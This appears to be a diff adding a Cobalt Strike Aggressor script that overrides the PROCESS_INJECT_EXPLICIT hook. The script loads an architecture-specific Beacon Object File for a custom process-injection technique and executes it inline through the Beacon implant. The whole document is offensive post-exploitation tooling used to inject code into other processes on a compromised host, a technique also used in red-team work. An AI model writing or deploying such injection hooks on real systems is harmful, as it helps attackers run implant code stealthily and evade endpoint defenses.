@@ -1,0 +1,16 @@
+#
+# Custom Injection Technique
+#
+set PROCESS_INJECT_EXPLICIT {
+	$barch = barch( $1 );
+
+	$bofob = openf( script_resource( "InjectExplicitBof. $+ $barch $+ .o" ) );
+	$bofrw = readb( $bofob, -1 );
+	closef( $bofob );
+
+	$bargs = bof_pack( $1, "iib", $3, $4, $2 ); 
+	$entry = "InjectExplicitGo $+ $5";
+	beacon_inline_execute( $1, $bofrw, $entry, $bargs );
+
+	return 1;
+}
